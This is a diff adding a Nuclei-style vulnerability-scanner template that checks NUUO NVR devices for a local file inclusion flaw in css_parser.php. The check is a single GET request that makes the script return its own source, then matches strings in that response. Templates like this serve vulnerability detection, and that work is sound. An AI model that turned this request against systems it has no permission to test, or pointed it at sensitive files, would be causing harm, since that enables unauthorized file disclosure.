@@ -1,0 +1,20 @@
+id: poc-yaml-nuuo-local-file-inclusion
+info:
+  name: "NUUO NVR css_parser.php 本地文件包含漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: nuuo
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/css_parser.php?css=css_parser.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "$_GET['css']"
+      - type: word
+        part: header
+        words:
+          - "text/css"
